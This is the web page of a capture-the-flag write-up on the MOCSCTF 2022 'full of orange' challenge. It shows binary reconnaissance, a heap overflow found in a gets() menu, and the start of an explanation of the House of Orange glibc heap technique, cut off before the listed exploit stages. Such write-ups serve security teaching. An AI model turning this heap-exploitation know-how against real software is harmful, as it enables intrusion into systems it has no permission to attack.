<!DOCTYPE html><html lang="en" class="scroll-smooth"><head><link rel="apple-touch-icon" sizes="76x76" href="/static/favicons/apple-touch-icon.png?v=2"/><link rel="icon" type="image/png" sizes="32x32" href="/static/favicons/favicon-32x32.png?v=2"/><link rel="icon" type="image/png" sizes="16x16" href="/static/favicons/favicon-16x16.png?v=2"/><link rel="manifest" href="/static/favicons/site.webmanifest?v=2"/><link rel="mask-icon" href="/static/favicons/safari-pinned-tab.svg?v=2" color="#5bbad5"/><meta name="msapplication-TileColor" content="#da532c"/><meta name="theme-color" content="#ffffff"/><link rel="alternate" type="application/rss+xml" href="/feed.xml"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.11/dist/katex.min.css" integrity="sha384-Um5gpz1odJg5Z4HAmzPtgZKdTBHZdw8S29IecapCSB31ligYPhHQZMIlWLYQGVoc" crossorigin="anonymous"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><meta charSet="utf-8"/><script>!function(){try {var d=document.documentElement.classList;d.remove('light','dark');var e=localStorage.getItem('theme');d.add('dark');if("system"===e||(!e&&false)){var t="(prefers-color-scheme: dark)",m=window.matchMedia(t);m.media!==t||m.matches?d.add('dark'):d.add('light')}else if(e) d.add(e)}catch(e){}}()</script><meta content="width=device-width, initial-scale=1" name="viewport"/><title>MOCSCTF 2022 – full of orange</title><meta name="robots" content="follow, index"/><meta name="description" content="Heap overflow for shell."/><meta property="og:url" content="https://sekai.team/blog/mocsctf-2022/full-of-orange/"/><meta property="og:type" content="article"/><meta property="og:site_name" content="Project SEKAI"/><meta property="og:description" content="Heap overflow for shell."/><meta property="og:title" content="MOCSCTF 2022 – full of orange"/><meta property="og:image" content="https://og-vercel-ruby.vercel.app/api/sekai?title=MOCSCTF+2022+%E2%80%93+full+of+orange&amp;desc=Heap+overflow+for+shell.&amp;authors=Johnathan"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site" content="https://twitter.com/ProjectSEKAIctf"/><meta name="twitter:title" content="MOCSCTF 2022 – full of orange"/><meta name="twitter:description" content="Heap overflow for shell."/><meta name="twitter:image" content="https://og-vercel-ruby.vercel.app/api/sekai?title=MOCSCTF+2022+%E2%80%93+full+of+orange&amp;desc=Heap+overflow+for+shell.&amp;authors=Johnathan"/><meta property="article:published_time" content="2022-02-28T00:00:00.000Z"/><link rel="canonical" href="https://github.com/nhtri2003gmail/writeup-mocsctf2022.mocsctf.com-orange"/><link rel="canonical" href="https://sekai.team/blog/mocsctf-2022/full-of-orange/"/><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "Article",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://sekai.team/blog/mocsctf-2022/full-of-orange"
  },
  "headline": "MOCSCTF 2022 – full of orange",
  "image": [
    {
      "@type": "ImageObject",
      "url": "https://og-vercel-ruby.vercel.app/api/sekai?title=MOCSCTF+2022+%E2%80%93+full+of+orange&desc=Heap+overflow+for+shell.&authors=Johnathan"
    }
  ],
  "datePublished": "2022-02-28T00:00:00.000Z",
  "dateModified": "2022-02-28T00:00:00.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "Johnathan"
    }
  ],
  "publisher": {
    "@type": "Organization",
    "name": "Project SEKAI",
    "logo": {
      "@type": "ImageObject",
      "url": "https://sekai.team/static/images/fullLogo.svg"
    }
  },
  "description": "Heap overflow for shell."
}</script><meta name="next-head-count" content="21"/><link rel="preload" href="/_next/static/css/206f24680f6266ec.css" as="style"/><link rel="stylesheet" href="/_next/static/css/206f24680f6266ec.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/_next/static/chunks/webpack-09a75c9ee2bd415e.js" defer=""></script><script src="/_next/static/chunks/main-b8c3e234d7065a2c.js" defer=""></script><script src="/_next/static/chunks/pages/_app-b8cbc7cb85baf88e.js" defer=""></script><script src="/_next/static/chunks/framework-327e104994690a53.js" defer=""></script><script src="/_next/static/chunks/29107295-a2d0c8e72019a3ed.js" defer=""></script><script src="/_next/static/chunks/545-f1dc6b53ce85b08b.js" defer=""></script><script src="/_next/static/chunks/930-1296a6163e1e3cc6.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5B...slug%5D-9a47024c9df525b8.js" defer=""></script><script src="/_next/static/0wxHpwy3ehtFejYPlY-Z7/_buildManifest.js" defer=""></script><script src="/_next/static/0wxHpwy3ehtFejYPlY-Z7/_ssgManifest.js" defer=""></script><script src="/_next/static/0wxHpwy3ehtFejYPlY-Z7/_middlewareManifest.js" defer=""></script><style data-href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap">@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuLyfMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuGKYMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuFuYMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body class="antialiased text-black bg-white dark:bg-gray-900 dark:text-white"><div id="__next" data-reactroot=""><div class="max-w-3xl px-4 mx-auto sm:px-6 xl:max-w-5xl xl:px-0"><div class="flex flex-col justify-between h-screen"><header class="flex items-center justify-between py-10"><div><a aria-label="Visit home page" href="/"><div class="flex items-center justify-between"><div class="mr-3"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 468.7 215.63" height="80" width="auto"><defs><linearGradient id="fullLogo_svg__linear-gradient" x1="-7051.74" y1="5608.42" x2="-7051.74" y2="5392.1" gradientTransform="matrix(1 0 .15 -.99 6503.98 5547.9)" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#00e5ea"></stop><stop offset="1" stop-color="#00b5cc"></stop></linearGradient><linearGradient id="fullLogo_svg__linear-gradient-2" x1="1498.32" y1="4428.84" x2="1497.92" y2="4311.82" gradientTransform="matrix(1 0 0 -1 -1107.01 4435.41)" xlink:href="#fullLogo_svg__linear-gradient"></linearGradient><linearGradient id="fullLogo_svg__linear-gradient-3" x1="320.76" y1="14.17" x2="320.76" y2="47.97" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#0069a5"></stop><stop offset="1" stop-color="#003d6b"></stop></linearGradient><style>.fullLogo_svg__cls-1{fill:#fff}</style></defs><g id="fullLogo_svg__Project_SEKAI_Wide_White" data-name="Project SEKAI Wide White"><path class="fullLogo_svg__cls-1" d="M107 117.14v-4c11.93 0 22.15-8.62 23.76-20l12.91-91.63h4.06l-13 92.14c-1.92 13.4-13.84 23.49-27.73 23.49Z"></path><path class="fullLogo_svg__cls-1" d="M97.43 98.3a16 16 0 0 1-16.26-18.72l8.68-61.42A21.78 21.78 0 0 1 110.77 0a16.34 16.34 0 0 1 12.57 5.5A16.36 16.36 0 0 1 127 18.72l-8.69 61.42c-1.39 10.01-10.77 18.16-20.88 18.16ZM110.77 4a17.63 17.63 0 0 0-17 14.72l-8.64 61.42a12 12 0 0 0 12.3 14.16 17.65 17.65 0 0 0 16.95-14.72l8.69-61.42a12.41 12.41 0 0 0-2.75-10A12.4 12.4 0 0 0 110.77 4ZM186.94 5.42l.56-3.91H162.99l-13.5 95.44H174l.57-4h-20.46l5.85-41.36h20.46l.56-4h-20.45l5.96-42.17h20.45zM266.73 1.51h-31.01l-.55 3.91h14.2l-12.95 91.53h4.06l12.93-91.53h12.77l.55-3.91zM212.61 1.51a15.86 15.86 0 0 0-15.24 13.24l-9.86 69.48a11.69 11.69 0 0 0 2.76 9.34 12.57 12.57 0 0 0 9.18 4.43h.2c6.38 0 11.65-5.57 15.15-9.28L211.9 86c-3.06 3.23-7.67 8.11-12.38 8a8.54 8.54 0 0 1-6.21-3 7.73 7.73 0 0 1-1.84-6.18l9.86-69.48a11.83 11.83 0 0 1 11.28-9.9h13.91l.55-3.91ZM37.08 5.58a12 12 0 0 0-9.26-4.06H13.5L0 97h4.06l6.41-45.37h10.84a15.87 15.87 0 0 0 15.24-13.29l3.25-23a12 12 0 0 0-2.72-9.76Zm-1.24 9.17-3.26 23a11.74 11.74 0 0 1-11.27 9.8H11l6-42.13h10.85a7.94 7.94 0 0 1 8 9.33ZM75.09 5.58a12 12 0 0 0-9.26-4.06h-14.3L38 97h4l6.5-45.42h10L65 96.2h4l-6.6-45a16 16 0 0 0 12.16-12.86l3.25-23a12 12 0 0 0-2.72-9.76Zm-1.24 9.17-3.25 23a11.76 11.76 0 0 1-11.28 9.8H49.07L55 5.42h10.86a7.94 7.94 0 0 1 8 9.33ZM223.75 215.47h-4.06l13.5-95.43h4.05l-13.49 95.43zM65.83 215.63a14.49 14.49 0 0 1-11-4.65 11.3 11.3 0 0 1-2.68-9.15l1.31-8.59 4.4-2.34-1.76 11.52a7.24 7.24 0 0 0 1.75 5.93 10.47 10.47 0 0 0 8 3.28c6.42 0 12.26-4.39 13-9.8l5.42-38.33-28.77 15.27 6.37-46c1-7.3 8.65-13.24 17-13.24a14.52 14.52 0 0 1 11 4.65 11.36 11.36 0 0 1 2.68 9.14l-1.2 8.68-4.35 2.34 1.64-11.6a7.29 7.29 0 0 0-1.74-6 10.5 10.5 0 0 0-8-3.28c-6.42 0-12.26 4.39-13 9.79l-5.29 38.27 28.8-15.28-6.52 46.1c-1.11 7.35-8.73 13.29-17.06 13.29ZM174.15 120.04h-4.51l-26.9 51.72 7.31-51.72H146l-13.5 95.43h4.05l4.5-31.8 10.61-20.4 12.61 52.2h4.11l-13.91-57.6 19.68-37.83zM205 215.47h4l-2.29-94.87v-.56h-4l-29.31 95.43h4.18l9.82-32h16.83Zm-16.37-36L203 132.68l1.13 46.81ZM132.58 123.94l.56-3.91h-24.52l-13.49 95.44h24.51l.56-4H99.75l5.85-41.36h20.45l.57-4h-20.46l5.97-42.17h20.45z"></path><path style="fill:url(#fullLogo_svg__linear-gradient)" d="M279.69 1.51h8.87l-32.09 213.93h-8.87L279.69 1.51z"></path><path d="M393.81 14.88C396 .34 331.4 1.5 296.53 1.5L283.6 87.67c33.36-1.94 99.5-2 97.21 13.27-1.14 7.58-5.53 7.29-6.1 11.08-1.52 10.14 70.94 5.62 81.15 4.52L434 73.6l34.7-43.29c-17.47 1.81-82.47 4.94-81.11-4.15.73-4.87 5.41-5.56 6.22-11.28Z" style="fill:url(#fullLogo_svg__linear-gradient-2)"></path><path d="m324.34 13-5.8 25.24A9.73 9.73 0 0 0 312 36c-4.66 0-8.43 2.82-8.42 6.27s3.8 6.24 8.46 6.22c4 0 7.4-2.12 8.23-4.92 0-.14.06-.28.09-.42l3.48-15.5q9.18 2.06 9.72 5.26a9 9 0 0 1-1.27 6.22 10.78 10.78 0 0 0 5.7-8.81q.48-5.88-13.65-17.32Z" style="fill:url(#fullLogo_svg__linear-gradient-3)"></path></g></svg></div></div></a></div><div class="flex items-center text-base leading-5"><div class="hidden sm:block"><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/members/">Members</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/contests/">Contests</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/blog/">Blog</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/tags/">Tags</a><a target="_blank" rel="noopener noreferrer" href="https://ctf.sekai.team/" class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100">CTF 2023</a></div><div class="sm:hidden"><button type="button" class="w-8 h-8 py-1 ml-1 mr-1 rounded" aria-label="Toggle Menu"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="text-gray-900 dark:text-gray-100"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg></button><div class="fixed w-full h-full top-24 right-0 bg-gray-200 dark:bg-gray-800 opacity-95 z-10 transform ease-in-out duration-300 translate-x-full"><button type="button" aria-label="toggle modal" class="fixed w-full h-full cursor-auto focus:outline-none"></button><nav class="fixed h-full mt-8"><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/members/">Members</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/contests/">Contests</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/blog/">Blog</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/tags/">Tags</a></div><div class="px-12 py-4"><a target="_blank" rel="noopener noreferrer" href="https://ctf.sekai.team/" class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100">CTF 2023</a></div></nav></div></div></div></header><main class="mb-auto"><div class="max-w-3xl px-4 mx-auto sm:px-6 xl:max-w-5xl xl:px-0"><article><div class="xl:divide-y xl:divide-gray-200 xl:dark:divide-gray-700"><header class="pt-6 xl:pb-6"><div class="space-y-1 text-center"><dl class="space-y-10"><div><dt class="sr-only">Published on</dt><dd class="text-base font-medium leading-6 text-gray-500 dark:text-gray-400"><time dateTime="2022-02-28T00:00:00.000Z">Monday, 28 February 2022</time></dd></div></dl><div><h1 class="text-3xl font-extrabold leading-9 tracking-tight text-gray-900 dark:text-gray-100 sm:text-4xl sm:leading-10 md:text-5xl md:leading-14">MOCSCTF 2022 – full of orange</h1></div></div></header><div class="pb-8 divide-y divide-gray-200 xl:divide-y-0 dark:divide-gray-700 xl:grid xl:grid-cols-4 xl:gap-x-6" style="grid-template-rows:auto 1fr"><dl class="pt-6 pb-10 xl:pt-11 xl:border-b xl:border-gray-200 xl:dark:border-gray-700"><dt class="sr-only">Authors</dt><dd><ul class="flex justify-center space-x-8 xl:block sm:space-x-12 xl:space-x-0 xl:space-y-8"><li class="flex items-center space-x-2"><img src="https://www.gravatar.com/avatar/aa9cc3f27f3b1f3c47841d62f18c039f?d=identicon&amp;s=256" width="38px" height="38px" alt="avatar" class="w-10 h-10 rounded-full"/><dl class="text-sm font-medium leading-5 whitespace-nowrap"><dt class="sr-only">Name</dt><dd class="text-gray-900 dark:text-gray-100">Johnathan</dd><dt class="sr-only">Twitter</dt><dd><a target="_blank" rel="noopener noreferrer" href="https://github.com/nhtri2003gmail" class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400">@nhtri2003gmail</a></dd></dl></li></ul></dd></dl><div class="divide-y divide-gray-200 dark:divide-gray-700 xl:pb-0 xl:col-span-3 xl:row-span-2"><div class="pt-10 pb-8 prose dark:prose-dark max-w-none"><h2 id="full-of-orange"><a href="#full-of-orange" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Full of Orange</h2>
<ul><li class="false"><a href="#1-find-bug">1. Find bug</a></li><li class="false"><a href="#2-brainstorming">2. Brainstorming</a></li><li class="ml-6"><a href="#technique">Technique</a></li><li class="ml-6"><a href="#brainstorming">Brainstorming</a></li><li class="false"><a href="#3-exploit">3. Exploit</a></li><li class="ml-6"><a href="#stage-1-leak-main-arena-address">Stage 1: Leak main arena address</a></li><li class="ml-6"><a href="#stage-2-free-2-small-chunks">Stage 2: Free 2 small chunks</a></li><li class="ml-6"><a href="#stage-3-get-shell">Stage 3: Get shell</a></li><li class="false"><a href="#4-get-flag">4. Get flag</a></li></ul>
<h3 id="reference-source"><a href="#reference-source" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Reference source</h3>
<ul>
<li><a target="_blank" rel="noopener noreferrer" href="https://1ce0ear.github.io/2017/11/26/study-house-of-orange/">Understanding the house of orange – 1ce0ear</a></li>
<li><a target="_blank" rel="noopener noreferrer" href="https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html">HITCON CTF Qual 2016 - House of Orange Write up – Pwning My Life</a></li>
<li><a target="_blank" rel="noopener noreferrer" href="https://github.com/shellphish/how2heap">shellphish/how2heap – GitHub</a></li>
<li><a target="_blank" rel="noopener noreferrer" href="https://dystopia.sg/seccon-beginners-2021-freeless/">SECCON BEGINNERS: FREELESS (PWN) – THE DYSTOPIAN KNIGHT</a></li>
</ul>
<hr/>
<p>Origin challenge link: <a target="_blank" rel="noopener noreferrer" href="https://mocsctf2022.mocsctf.com/challenges">https://mocsctf2022.mocsctf.com/challenges</a></p>
<p>You can also download challenge in my repo: <a target="_blank" rel="noopener noreferrer" href="https://github.com/nhtri2003gmail/writeup-mocsctf2022.mocsctf.com-orange/blob/master/orange.zip">orange.zip</a></p>
<p>There will be 2 files in zip:</p>
<ul>
<li>freefree</li>
<li>libc-2.31.so</li>
</ul>
<p>Download zip, then extract and use <code>pwninit</code> to patch libc to challenge file. And now let’s start!</p>
<h2 id="1-find-bug"><a href="#1-find-bug" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>1. Find bug</h2>
<p>First, we use <code>file</code> command to check for basic infomation:</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">$ <span class="token function">file</span> freefree
</span><span class="code-line">freefree: ELF <span class="token number">64</span>-bit LSB pie executable, x86-64, version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>88c0525daecc504cb81ee1e9104e218cfa4ffdc6, <span class="token keyword">for</span> GNU/Linux <span class="token number">3.2</span>.0, not stripped
</span></code></pre></div>
<p>This is a 64-bit file without being stripped. Next, we will use <code>checksec</code> to check for all security of challenge file:</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">$ checksec freefree
</span><span class="code-line">    Arch:     amd64-64-little
</span><span class="code-line">    RELRO:    Partial RELRO
</span><span class="code-line">    Stack:    No canary found
</span><span class="code-line">    NX:       NX enabled
</span><span class="code-line">    PIE:      PIE enabled
</span></code></pre></div>
<p>Well, it’s <code>PIE enabled</code>, quite hard for us when we need to debug things. Also <code>NX enabled</code> which means we cannot get our shellcode on stack works.</p>
<p>Finally, let’s fire up ghidra and get the main flow of program. There are just 1 interesing function is main() with 4 option <code>malloc</code>, <code>gets</code> which we input to chunk, <code>puts</code> which print out data of that chunk terminated by null-byte and <code>exit</code>.</p>
<p>Let’s run the program to get it easily. At the menu, we can see things like this:</p>
<p><img src="/static/images/mocsctf-2022/menu.png" alt="menu.png"/></p>
<p>It tells us that we could use a technique called <a target="_blank" rel="noopener noreferrer" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_orange.c">House of Orange</a>. Analizing in ghidra and run in terminal, we know that it can take the variable name from <code>A</code> to <code>Z</code> by getting its index:</p>
<p><img src="/static/images/mocsctf-2022/variable.png" alt="variable.png"/></p>
<p>So that <code>X</code> can be from <code>A</code> to <code>Z</code>:</p>
<p><img src="/static/images/mocsctf-2022/input_var_terminal.png" alt="input_var_terminal.png"/></p>
<p>This means we can contain and control upto 25 chunk. And one more thing we can notice is that with each chunk, we can write unlimited data to that chunk, hence overwrite the next chunk → <strong>Heap Overflow</strong>:</p>
<p><img src="/static/images/mocsctf-2022/gets_main.png" alt="gets_main.png"/></p>
<p>And that’s all we can find, just 25 chunks with <strong>Heap Overflow</strong> and no free(), let’s see the magic right now!</p>
<h2 id="2-brainstorming"><a href="#2-brainstorming" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>2. Brainstorming</h2>
<p>If you are not familiar with heap, just read this to know about all kinds of chunk: <a target="_blank" rel="noopener noreferrer" href="https://guyinatuxedo.github.io/25-heap/index.html">https://guyinatuxedo.github.io/25-heap/index.html</a></p>
<h3 id="technique"><a href="#technique" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Technique</h3>
<p>The main thing to remember is that if we <code>malloc(0x1000)</code> but top chunk size is just 0x300, which means that top chunk cannot satisfy the malloc. Hence, that top chunk will be freed and program will malloc 0x1000 byte on the next page of heap.</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">---------------------                    -----------------------
</span><span class="code-line">|    some chunks    |                    |     some chunks     |
</span><span class="code-line">---------------------   malloc(0x1000)   -----------------------
</span><span class="code-line">| top chunk (0x300) |  ---------------&gt;  | freed chunk (0x300) |
</span><span class="code-line">---------------------                    -----------------------
</span><span class="code-line">| unallocated space |                    | new chunk (0x1000)  |
</span><span class="code-line">|                   |                    -----------------------
</span><span class="code-line">|                   |                    |    new top chunk    |
</span><span class="code-line">---------------------                    -----------------------
</span></code></pre></div>
<p>The other thing is that we can only malloc maximum 0x1000 bytes.</p>
<p>To be clear, we will take this example below. The heap is usually allocated with a top chunk of size 0x21000. So when we malloc a 0x400-byte chunk, the top chunk will split itself and remain <code>0x21000 - 0x400 = 0x20c00</code> with the bit <code>PREV_INUSE</code> is set:</p>
<p><img src="/static/images/mocsctf-2022/Technique_malloc1.png" alt="Technique_malloc1.png"/></p>
<p>Now we want to malloc maximum 0x1000, so the top chunk size need to be lower than 0x1000 to conduct this technique. Let’s assume that we can change the top chunk size by somehow. Because there is a check about the alignment of top chunk so just to make sure that:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">(top chunk address + top chunk size) % 0x1000 == 0
